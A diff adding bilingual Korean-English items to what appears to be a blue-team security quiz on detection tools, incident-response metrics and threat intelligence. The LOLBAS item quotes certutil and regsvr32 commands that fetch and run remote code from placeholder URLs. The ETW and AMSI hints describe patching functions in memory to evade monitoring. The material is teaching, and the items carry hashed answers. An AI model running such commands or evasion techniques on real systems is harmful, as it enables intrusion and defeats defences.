+      "en": "An address can be swapped out today and one changed byte gives a file a new hash, but the way an adversary has learned to work is not replaced so cheaply. Which three-letter abbreviation covers what they aim at, by what method, and in what practised order? MITRE ATT&CK is a grid built at exactly this layer."
+    },
+    "hints": {
+      "ko": [
+        "전술·기법·절차, 세 낱말의 머리글자입니다.",
+        "고통의 피라미드에서 맨 위에 놓입니다 — 여기를 막히면 공격자는 도구를 바꾸는 정도가 아니라 일하는 법을 다시 배워야 합니다."
+      ],
+      "en": [
+        "The initials of tactics, techniques and procedures.",
+        "It sits at the top of the pyramid of pain: blocked here, an adversary has to relearn how they work rather than merely swap a tool."
+      ]
+    }
+  },
+  {
+    "id": "t3_falco",
+    "tier": 3,
+    "cat": "detection",
+    "track": "blueteam",
+    "points": 120,
+    "ci": true,
+    "hash": "f5bed22b9f4bed888f77f06c03a5d6aaef691682aa2820f6158919427f905194",
+    "fmt": "도구 이름 / tool name",
+    "title": {
+      "ko": "컨테이너 안에서 일어난 일",
+      "en": "What Happened Inside the Container"
+    },
+    "prompt": {
+      "ko": "커널에서 시스템 호출을 eBPF 로 지켜보다가 YAML 규칙에 걸리면 경보를 올리는 CNCF 런타임 보안 도구입니다. `condition: container.id != host and proc.name = bash` 처럼 컨테이너 안에서 셸이 뜨거나 `/etc/shadow` 가 열리는 순간을 잡아냅니다. 이름은?",
+      "en": "A CNCF runtime security tool that watches system calls from the kernel with eBPF and raises an alarm when a YAML rule matches. Conditions like `condition: container.id != host and proc.name = bash` catch the moment a shell appears inside a container or `/etc/shadow` is opened. What is it called?"
+    },
+    "hints": {
+      "ko": [
+        "이탈리아어로 매를 뜻하는 낱말이고, 만든 회사 이름도 같은 새에서 왔습니다.",
+        "막지 않고 알리기만 하는 것이 기본이라, 차단은 별도의 대응 장치에 넘겨야 합니다."
+      ],
+      "en": [
+        "The Italian word for a falcon; the company that built it took its name from the same bird.",
+        "By default it only tells you, it does not stop anything — blocking has to be handed to a separate response component."
+      ]
+    }
+  },
+  {
+    "id": "t3_etw",
+    "tier": 3,
+    "cat": "detection",
+    "track": "blueteam",
+    "points": 125,
+    "ci": true,
+    "hash": "30dbb0eea41764b8f9cbc25277d55b8e4035c231c2bbfa344214adf7a04ee8dd",
+    "fmt": "약어 / acronym (3글자 / 3 chars)",
+    "title": {
+      "ko": "윈도우가 스스로 흘리는 것",
+      "en": "What Windows Emits by Itself"
+    },
+    "prompt": {
+      "ko": "윈도우 커널과 수백 개의 구성 요소가 자기 안에서 벌어지는 일을 실시간으로 흘려보내는 기본 계측 장치입니다. 제공자가 내보내고 세션이 모으며 소비자가 받아 가는 구조라, 보안 제품들은 `.NET` 어셈블리 적재나 PowerShell 스크립트 블록 같은 것을 여기서 받아 봅니다. 그래서 공격자는 자기 프로세스 안에서 이 통로를 끊는 수법을 즐겨 씁니다. 세 글자 약어는?",
+      "en": "The built-in instrumentation through which the Windows kernel and hundreds of components emit, in real time, what is happening inside them. Providers write, sessions collect and consumers read, which is how security products see things like a `.NET` assembly being loaded or a PowerShell script block. It is also why adversaries like to sever this pipe inside their own process. What is the three-letter abbreviation?"
+    },
+    "hints": {
+      "ko": [
+        "Event Tracing for Windows 의 머리글자입니다.",
+        "자기 프로세스 안의 함수 하나를 즉시 반환하도록 고쳐 놓으면 그 프로세스에서 나가는 흐름만 조용히 끊깁니다 — 시스템 전체는 멀쩡해 보입니다."
+      ],
+      "en": [
+        "The initials of Event Tracing for Windows.",
+        "Patch one function inside your own process to return immediately and only that process stops emitting — the rest of the system looks perfectly healthy."
+      ]
+    }
+  },
+  {
+    "id": "t3_amsi",
+    "tier": 3,
+    "cat": "detection",
+    "track": "blueteam",
+    "points": 130,
+    "ci": true,
+    "hash": "8d7c969ccf0975a7766a17c3beaccbd26de1cadf2bf2fabd4e7125a8471611d2",
+    "fmt": "약어 / acronym (4글자 / 4 chars)",
+    "title": {
+      "ko": "풀어 놓은 뒤에 본다",
+      "en": "Looked At After It Unwraps"
+    },
+    "prompt": {
+      "ko": "난독화된 스크립트는 디스크에서 봐야 아무 소용이 없습니다. 그래서 윈도우는 PowerShell·VBScript·오피스 매크로가 코드를 실행 직전에 넘겨 주면 등록된 백신에 검사시키는 표준 창구를 둡니다. 평문으로 풀린 상태를 보기 때문에 껍데기를 아무리 씌워도 소용이 없고, 그래서 공격자는 자기 프로세스에 적재된 그 DLL 의 검사 함수를 메모리에서 고쳐 무력화합니다. 네 글자 약어는?",
+      "en": "Looking at an obfuscated script on disk tells you nothing, so Windows provides a standard doorway where PowerShell, VBScript and Office macros hand code over just before it runs and the registered antivirus inspects it. It sees the plaintext after every wrapper is gone, which is why attackers patch the scanning function of its DLL in their own process memory instead. What is the four-letter abbreviation?"
+    },
+    "hints": {
+      "ko": [
+        "Antimalware Scan Interface 의 머리글자입니다.",
+        "검사 함수가 \"깨끗함\"에 해당하는 값을 곧바로 돌려주게 만드는 몇 바이트짜리 수정이 가장 흔한 무력화 방법입니다."
+      ],
+      "en": [
+        "The initials of Antimalware Scan Interface.",
+        "The usual defeat is a few bytes that make the scanning function return the value meaning \"clean\" straight away."
+      ]
+    }
+  },
+  {
+    "id": "t3_lolbas",
+    "tier": 3,
+    "cat": "detection",
+    "track": "blueteam",
+    "points": 130,
+    "ci": true,
+    "hash": "57ea3f83892b765075bcc3af5798a4c13862900e18911ad45a4281fab7426e62",
+    "fmt": "약어 / acronym (6글자 / 6 chars)",
+    "title": {
+      "ko": "이미 서명되어 들어 있는 무기",
+      "en": "Weapons That Shipped Signed"
+    },
+    "prompt": {
+      "ko": "`certutil -urlcache -f http://.../a.exe a.exe` 로 파일을 내려받고, `regsvr32 /s /i:http://.../a.sct scrobj.dll` 로 원격 스크립트를 돌립니다. 둘 다 마이크로소프트가 서명해 윈도우에 기본으로 들어 있는 실행 파일이라 허용 목록도 서명 검사도 통과합니다. 이렇게 전용 도구를 들고 오지 않고 있는 것만으로 해내는 방식과, 그런 파일들을 모아 둔 공개 목록을 함께 가리키는 여섯 글자 약어는?",
+      "en": "`certutil -urlcache -f http://.../a.exe a.exe` fetches a file; `regsvr32 /s /i:http://.../a.sct scrobj.dll` runs a remote script. Both are Microsoft-signed executables that ship with Windows, so they satisfy allow-lists and signature checks alike. Which six-letter abbreviation names both this way of working — bringing no tooling of your own and using only what is already there — and the public catalogue of such files?"
+    },
+    "hints": {
+      "ko": [
+        "\"땅에서 나는 것으로 살아간다\"는 영어 표현의 머리글자에, 그 대상인 바이너리와 스크립트를 뜻하는 두 글자를 덧붙인 이름입니다.",
+        "유닉스 쪽에도 같은 발상의 짝이 되는 목록이 따로 있습니다."
+      ],
+      "en": [
+        "The initials of the English expression for living off the land, followed by two letters for the binaries and scripts it covers.",
+        "The Unix side has its own companion catalogue built on the same idea."
+      ]
+    }
+  },
+  {
+    "id": "t4_ueba",
+    "tier": 4,
+    "cat": "detection",
+    "track": "blueteam",
+    "points": 140,
+    "ci": true,
+    "hash": "3d6815483239738fb2142821f7ded8e61c7fa51fcbdf94d10a06e4eb124f4feb",
+    "fmt": "약어 / acronym (4글자 / 4 chars)",
+    "title": {
+      "ko": "평소와 다른 하루",
+      "en": "A Day Unlike the Others"
+    },
+    "prompt": {
+      "ko": "규칙은 \"무엇이 나쁜지\"를 미리 적어 둬야 하지만, 이 방식은 사람과 계정과 장비마다 평소 모습을 몇 주에 걸쳐 학습해 두고 거기서 벗어나는 순간에 점수를 매깁니다. 늘 서울에서 낮에 접속하던 계정이 새벽 세 시에 다른 나라에서 들어와 평소의 200배를 내려받으면, 규칙 하나 없이도 위험 점수가 올라갑니다. 사람뿐 아니라 서버·서비스 계정 같은 개체까지 함께 본다는 뜻이 이름에 들어 있는 네 글자 약어는?",
+      "en": "A rule has to state in advance what is bad. This approach instead learns, over weeks, what each person, account and machine normally looks like, and scores the moments that depart from it. An account that always signs in from Seoul during the day, arriving from another country at three in the morning and pulling two hundred times its usual volume, raises a risk score without any rule being written. Its name says it watches not only people but entities such as servers and service accounts. What is the four-letter abbreviation?"
+    },
+    "hints": {
+      "ko": [
+        "User and Entity Behavior Analytics 의 머리글자입니다.",
+        "학습 기간에 이미 침해된 상태였다면 그 침해가 \"평소\"로 굳어져 영영 눈에 띄지 않습니다."
+      ],
+      "en": [
+        "The initials of User and Entity Behavior Analytics.",
+        "If the estate was already compromised while the baseline was being learned, the compromise becomes \"normal\" and is never flagged."
+      ]
+    }
+  },
+  {
+    "id": "t4_soar",
+    "tier": 4,
+    "cat": "ir",
+    "track": "blueteam",
+    "points": 150,
+    "ci": true,
+    "hash": "3388452318b2e7225fe9e2d8f00db264cae9f9468d0a31e2cd7fbf9c47a9c555",
+    "fmt": "약어 / acronym (4글자 / 4 chars)",
+    "title": {
+      "ko": "사람이 손으로 하던 스무 단계",
+      "en": "The Twenty Steps Somebody Used to Do by Hand"
+    },
+    "prompt": {
+      "ko": "경보 하나가 뜰 때마다 분석가는 평판 조회를 하고, 자산 대장에서 주인을 찾고, 메일을 보내고, 티켓을 열고, 필요하면 단말을 망에서 떼어 냅니다. 이 계층은 그 스무 단계를 여러 제품의 API 를 엮은 하나의 흐름으로 미리 그려 두고, 조건 분기와 \"사람이 여기서 승인\" 지점까지 넣어 자동으로 돌립니다. 네 글자 약어로 무엇일까요?",
+      "en": "For every alert an analyst looks up a reputation, finds the owner in the asset inventory, sends mail, opens a ticket, and if need be cuts the endpoint off the network. This layer draws those twenty steps in advance as one flow stitched together from several products' APIs, complete with conditional branches and points where a human must approve, and then runs it. Which four-letter abbreviation names it?"
+    },
+    "hints": {
+      "ko": [
+        "Security Orchestration, Automation and Response 의 머리글자입니다.",
+        "자동화가 잘못된 경보 위에서 돌면 실수도 사람보다 훨씬 빠르게 퍼집니다 — 그래서 되돌리는 흐름을 함께 그려 둡니다."
+      ],
+      "en": [
+        "The initials of Security Orchestration, Automation and Response.",
+        "Automation running on a wrong alert spreads the mistake far faster than a human would, which is why the undo flow is drawn alongside it."
+      ]
+    }
+  },
+  {
+    "id": "t4_mttd",
+    "tier": 4,
+    "cat": "ir",
+    "track": "blueteam",
+    "points": 150,
+    "ci": true,
+    "hash": "b67500796c18ea2238889db21cc98656fb1532373940096226b594b6642da11a",
+    "fmt": "약어 / acronym (4글자 / 4 chars)",
+    "title": {
+      "ko": "들어온 날과 알아챈 날 사이",
+      "en": "Between the Day In and the Day Noticed"
+    },
+    "prompt": {
+      "ko": "침입이 시작된 시각부터 방어하는 쪽이 그것을 처음 알아차린 시각까지의 평균 간격을 재는 지표입니다. 업계 보고서가 해마다 \"며칠\"이라고 발표하는 그 숫자이고, 이 값이 길수록 공격자가 조용히 돌아다닌 기간도 그만큼 깁니다. 알아챈 뒤에 얼마나 빨리 수습했는지는 짝을 이루는 다른 지표가 따로 잽니다. 네 글자 약어는?",
+      "en": "The metric for the average gap between the moment an intrusion begins and the moment the defenders first notice it. It is the number industry reports publish each year as \"so many days\", and the longer it runs the longer an adversary moved around unseen. How quickly matters were set right afterwards is measured by a separate, companion metric. What is the four-letter abbreviation?"
+    },
+    "hints": {
+      "ko": [
+        "Mean Time To Detect 의 머리글자입니다.",
+        "끝내 스스로 알아채지 못하고 외부 통보로 알게 된 사건은 평균에서 조용히 빠지기 쉬워, 숫자가 실제보다 좋아 보입니다."
+      ],
+      "en": [
+        "The initials of Mean Time To Detect.",
+        "Cases the organisation never noticed itself, learning of them from an outside notification, tend to fall out of the average and make the number look better than it is."
+      ]
+    }
+  },
+  {
+    "id": "t4_mttr",
+    "tier": 4,
+    "cat": "ir",
+    "track": "blueteam",
+    "points": 155,
+    "ci": true,
+    "hash": "3c6e9d75e65f66cf5345c98ebbeeedc1d5571e499f73f6b0e3e492475d17acc4",
+    "fmt": "약어 / acronym (4글자 / 4 chars)",
+    "title": {
+      "ko": "알아챈 다음이 진짜다",
+      "en": "Noticing Is Only Half of It"
+    },
+    "prompt": {
+      "ko": "경보가 뜬 다음부터 위협을 걷어 내고 업무를 정상으로 되돌리기까지 걸린 평균 시간입니다. 마지막 글자를 무엇으로 읽느냐에 따라 대응·복구·수습 등으로 조금씩 달리 쓰이기 때문에, 지표를 발표할 때는 시계를 언제 멈추는지부터 정의해 두어야 합니다. 침입을 알아차리기까지 걸린 시간은 짝을 이루는 다른 지표가 잽니다. 네 글자 약어는?",
+      "en": "The average time from the alert going up to the threat being removed and normal work resumed. What the last letter stands for varies — respond, recover, remediate — so any published figure has to define when the clock stops. Time taken to notice the intrusion in the first place is what the companion metric measures. What is the four-letter abbreviation?"
+    },
+    "hints": {
+      "ko": [
+        "Mean Time To 로 시작하는 네 낱말의 머리글자이고, 마지막 낱말은 R 로 시작합니다.",
+        "단말을 망에서 떼어 낸 시각에 시계를 멈추면 숫자는 예뻐지지만, 공격자가 남긴 지속성이 그대로 남아 있는 경우가 있습니다."
+      ],
+      "en": [
+        "The initials of four words starting with Mean Time To, the last beginning with R.",
+        "Stopping the clock when the endpoint left the network makes the figure look good while the persistence the adversary left behind is still sitting there."
+      ]
+    }
+  },
+  {
+    "id": "t4_navigator",
+    "tier": 4,
+    "cat": "intel",
+    "track": "blueteam",
+    "points": 160,
+    "ci": true,
+    "hash": "ebf49dcd836f810084c14e0f2dab4dc1768bbdc5980481bf201fcf76771dff7a",
+    "fmt": "도구 이름 / tool name (9글자 / 9 chars)",
+    "title": {
+      "ko": "격자를 색칠하다",
+      "en": "Colouring In the Grid"
+    },
+    "prompt": {
+      "ko": "MITRE ATT&CK 의 기법 격자를 웹에서 펼쳐 놓고, 칸마다 점수와 색을 입혀 JSON 레이어로 저장하는 공식 도구입니다. 우리가 탐지하는 기법을 초록으로 칠한 레이어와 특정 공격 집단이 쓰는 기법을 칠한 레이어를 겹쳐 빼기 연산을 하면, 빨갛게 남는 칸이 곧 우리가 못 보는 구멍입니다. 이 도구의 이름은?",
+      "en": "The official web tool that lays out the MITRE ATT&CK technique grid and lets you score and colour each cell, saving the result as a JSON layer. Colour one layer green for the techniques you detect, another for the techniques a particular group uses, then subtract one from the other: the cells left red are the holes you cannot see through. What is the tool called?"
+    },
+    "hints": {
+      "ko": [
+        "배를 몰아 길을 찾는 사람을 뜻하는 영어 낱말이고, 아홉 글자입니다.",
+        "격자를 온통 초록으로 칠해 놓고 만족하는 것이 가장 흔한 함정입니다 — 규칙이 있다는 것과 그 규칙이 실제로 걸린다는 것은 다릅니다."
+      ],
+      "en": [
+        "The English word for the person who steers a ship and finds the way, nine letters long.",
+        "The usual trap is painting the whole grid green and feeling safe — having a rule and having a rule that actually fires are not the same thing."
+      ]
+    }
+  },
+  {
+    "id": "t4_emulation",
+    "tier": 4,
+    "cat": "intel",
+    "track": "blueteam",
+    "points": 160,
+    "ci": true,
+    "hash": "9011e2be96ee602be60f9778230797fbbfafe98a33a3bdd61d273820df5f7ddc",
+    "fmt": "한 단어 / one word (9글자 / 9 chars)",
+    "title": {
+      "ko": "그 집단인 척 해 보기",
+      "en": "Playing That Group for a Week"
+    },
+    "prompt": {
+      "ko": "막연히 \"침투해 보라\"가 아니라, 위협 정보가 특정 공격 집단에 대해 기록해 둔 순서를 그대로 재현해 우리 탐지가 어느 단계에서 울리는지 확인하는 훈련 방식입니다. 그 집단이 쓰던 적재 방식과 통신 주기까지 흉내 내고, 각 단계마다 경보가 떴는지를 표로 남깁니다. 이 방식을 가리키는 아홉 글자 한 단어는?",
+      "en": "Not a vague \"try to break in\", but an exercise that reproduces, step for step, the sequence threat intelligence has recorded for one particular group, to see at which step your detection fires. The loading method and the callback interval that group used are imitated too, and whether an alarm went up at each step is written down in a table. Which nine-letter word names this?"
+    },
+    "hints": {
+      "ko": [
+        "흉내 낸다는 뜻의 영어 동사에서 온 명사이고, 아홉 글자입니다. 하드웨어를 흉내 내는 프로그램에도 같은 뿌리의 낱말을 씁니다.",
+        "비슷해 보이는 낱말로 \"가상으로 해 보기\"가 있는데, 그쪽은 실제로 실행하지 않고 탁상에서 따져 보는 쪽을 가리킵니다."
+      ],
+      "en": [
+        "A noun from the English verb meaning to imitate, nine letters long; a program that imitates hardware takes its name from the same root.",
+        "A similar-looking word means working it through on paper without actually running anything — that is the other kind of exercise."
+      ]
+    }
+  },
+  {
+    "id": "t4_purple",
+    "tier": 4,
+    "cat": "ir",
+    "track": "blueteam",
+    "points": 170,
+    "ci": true,
+    "hash": "8e0a1b0ada42172886fd1297e25abf99f14396a9400acbd5f20da20289cff02f",
+    "fmt": "한 단어 / one word (6글자 / 6 chars)",
+    "title": {
+      "ko": "두 색을 섞으면",
+      "en": "Mix the Two Colours"
+    },
+    "prompt": {
+      "ko": "공격하는 쪽은 보고서를 덮어 놓고 몇 달 뒤에 결과만 내놓고, 지키는 쪽은 무엇이 지나갔는지 모른 채 규칙을 다듬습니다. 이 방식은 두 팀을 한 방에 앉혀 놓고, 기법 하나를 실행하는 즉시 화면을 같이 보며 \"울렸나? 안 울렸다면 왜?\"를 그 자리에서 고쳐 다시 실행합니다. 두 팀을 상징하는 색을 섞으면 나오는 이 이름은? (여섯 글자 한 단어)",
+      "en": "One side keeps its report closed and delivers findings months later; the other tunes rules without knowing what went past them. This way of working sits both teams in one room, runs a single technique, watches the console together — \"did it fire? if not, why?\" — fixes it on the spot and runs it again. Mix the colours that stand for the two teams and you get this name. (one word, six letters)"
+    },
+    "hints": {
+      "ko": [
+        "빨강과 파랑을 섞으면 나오는 색입니다.",
+        "상설 조직이라기보다 일하는 방식에 가까워서, 두 팀이 그대로 있어도 이렇게 앉기만 하면 됩니다."
+      ],
+      "en": [
+        "The colour you get by mixing red and blue.",
+        "It is less a standing team than a way of working: the two teams can stay as they are and simply sit down like this."
+      ]
+    }
+  },
+  {
+    "id": "t4_nist",
+    "tier": 4,
+    "cat": "ir",
+    "track": "blueteam",
+    "points": 180,
+    "ci": true,
+    "hash": "1b29226934e647c506c97b905f5a02a85a51bf786a0c72cd601765e0e3d2ff2d",
+    "fmt": "약어 / acronym (4글자 / 4 chars)",
+    "title": {
+      "ko": "네 단계로 도는 바퀴",
+      "en": "A Wheel of Four Stages"
+    },
+    "prompt": {
+      "ko": "미국 상무부 산하의 표준·기술 기관이 펴낸 특별 간행물 800-61 은 사고 대응을 준비 / 탐지와 분석 / 봉쇄·근절·복구 / 사후 활동 네 단계가 도는 바퀴로 정리했고, 이 기관의 다른 문서는 식별·보호·탐지·대응·복구 다섯 기능의 골격으로 더 널리 인용됩니다. 마지막 단계에서 배운 것을 다시 첫 단계로 돌려보내는 것이 이 모형의 핵심입니다. 이 기관의 네 글자 약어는?",
+      "en": "Special Publication 800-61, from the standards and technology institute under the US Department of Commerce, lays incident response out as a wheel of four stages — preparation; detection and analysis; containment, eradication and recovery; post-incident activity — and another document from the same institute is more widely cited for its five functions: identify, protect, detect, respond, recover. Feeding what the last stage learned back into the first is the point of the model. What is that institute's four-letter abbreviation?"
+    },
+    "hints": {
+      "ko": [
+        "National Institute of Standards and Technology 의 머리글자입니다.",
+        "여섯 단계로 나눈 다른 유명한 모형도 있는데, 그쪽은 봉쇄·근절·복구를 각각 떼어 셉니다."
+      ],
+      "en": [
+        "The initials of the National Institute of Standards and Technology.",
+        "Another well-known model counts six stages instead, splitting containment, eradication and recovery apart."
+      ]
+    }
+  },
+  {
+    "id": "t4_jitter",
+    "tier": 4,
+    "cat": "detection",
+    "track": "blueteam",
+    "points": 190,
+    "ci": true,
+    "hash": "16c7dc721bc2a15a1c933bd9aad8edd44a36d2bb20a3391337e268eb5895cea0",
+    "fmt": "한 단어 / one word (6글자 / 6 chars)",
+    "title": {
+      "ko": "시계처럼 정확한 것이 수상하다",
+      "en": "Suspiciously Punctual"
+    },
+    "prompt": {
+      "ko": "감염된 단말이 명령·제어 서버에 60초마다 정확히 한 번씩 물어보면, 방어하는 쪽은 목적지가 무엇이든 그 규칙적인 박자만으로 잡아냅니다. 그래서 공격 도구는 잠드는 시간을 60초 ±40% 처럼 매번 흩뜨려 박자를 지웁니다. 이 흩뜨림을 가리키는 여섯 글자 한 단어는? 네트워크 쪽에서는 지연 시간이 들쭉날쭉한 정도를 가리키는 같은 낱말입니다.",
+      "en": "If an infected endpoint asks its command-and-control server for orders exactly once every sixty seconds, defenders can pick it out from that regular rhythm alone, whatever the destination. So the tooling scatters the sleep — sixty seconds plus or minus forty percent, redrawn each time — and the rhythm disappears. Which six-letter word names that scattering? On the network side the same word describes how much latency varies."
+    },
+    "hints": {
+      "ko": [
+        "\"떨림\"이나 \"흔들림\"을 뜻하는 영어 낱말이고, 여섯 글자입니다.",
+        "흩뜨려도 평균은 남습니다 — 하루치를 모아 간격의 분포를 보면 사람이 만든 통신과는 여전히 다른 모양이 나옵니다."
+      ],
+      "en": [
+        "The English word for a shake or a wobble, six letters long.",
+        "Scattering does not remove the mean: gather a day of intervals and their distribution still does not look like traffic a person generates."
+      ]
+    }
+  },
+  {
+    "id": "t4_opencti",
+    "tier": 4,
+    "cat": "intel",
+    "track": "blueteam",
+    "points": 200,
+    "ci": true,
+    "hash": "b9c04d711edce04ee74cf5f63235df53bcff3c8eae171947811d59dbec261fa4",
+    "fmt": "도구 이름 / tool name",
+    "title": {
+      "ko": "지식을 그래프로 쌓다",
+      "en": "Knowledge Stacked as a Graph"
+    },
+    "prompt": {
+      "ko": "프랑스에서 시작한 오픈소스 위협 정보 플랫폼입니다. 표준 위협 표현 객체를 그대로 자료 모형으로 삼아 그래프 데이터베이스에 쌓고, GraphQL API 와 커넥터 구조로 외부 피드를 끌어와 같은 그래프에 합칩니다. 개별 흔적을 던져 두는 창고가 아니라 공격 집단·기법·침해 사건이 관계로 이어진 지식 그래프를 만드는 것이 목표라, 같은 대상을 가리키는 서로 다른 출처를 하나로 합치는 기능이 중심에 있습니다. 이 플랫폼의 이름은?",
+      "en": "An open-source threat intelligence platform that began in France. It takes the standard threat representation objects as its data model, stores them in a graph database, and pulls outside feeds into the same graph through a GraphQL API and a connector architecture. The goal is not a warehouse of loose indicators but a knowledge graph where groups, techniques and incidents are joined by relationships, so merging different sources that describe the same thing sits at its centre. What is the platform called?"
+    },
+    "hints": {
+      "ko": [
+        "이름은 \"열려 있다\"는 영어 낱말 뒤에 이 분야를 가리키는 세 글자 약어를 붙여 한 낱말로 씁니다.",
+        "커넥터가 같은 대상을 다른 이름으로 계속 집어넣으면 그래프가 중복으로 부풀어, 합치는 규칙을 손보는 것이 운영의 대부분이 됩니다."
+      ],
+      "en": [
+        "The name is the English word for open with this field's three-letter abbreviation stuck to it, written as one word.",
+        "When connectors keep inserting the same object under different names the graph bloats with duplicates, and tuning the merge rules becomes most of the operational work."
       ]
     }
   }
